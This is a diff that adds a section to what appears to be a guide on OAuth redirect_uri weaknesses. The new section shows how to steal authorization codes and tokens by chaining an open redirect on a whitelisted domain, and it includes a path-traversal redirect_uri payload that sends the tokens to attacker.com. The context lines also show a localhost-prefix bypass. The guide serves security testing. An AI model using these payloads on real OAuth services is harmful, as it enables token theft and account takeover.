@@ -45,5 +45,12 @@ Attacker can try parameter pollution as well, i.e. passing multiple values of ``
 Also, sometimes, a separate validation is done for localhost URIs. The validation logic checks for if the supplied ```redirect_uri``` starts with ```localhost``` or not. In that case, an attacker can simply have a subdomain like ```https://localhost.attacker.com```.   
 
 
+## Stealing codes and access tokens via a proxy page
+When OAuth server is checking for the presence of complete correct ```redirect_uri``` and not accepting the arbitrary value of the parameter, attacker can still try to point the redirect_uri to an endpoint in the whitelisted domain where the attacker has already discovered a vulnerability that allows him to pass the leaked tokens outside.   
+For an example, let's say the attacker has found an Open Redirection vulnerability in ```https://client-app.com/pages?path=``` and the OAuth server checks for the presence of whitelisted URI string ```https://client-app.com/oauth-callback```, then attacker can try passing this in the ```redirect uri``` :  
+```redirect_uri=https://client-app.com/oauth-callback/../pages?path=http://attacker.com```   
+With this, the attacker can use the whitelisted domain vulnerability as a "proxy" to export the leaked tokens outside.  
+
+
 
 
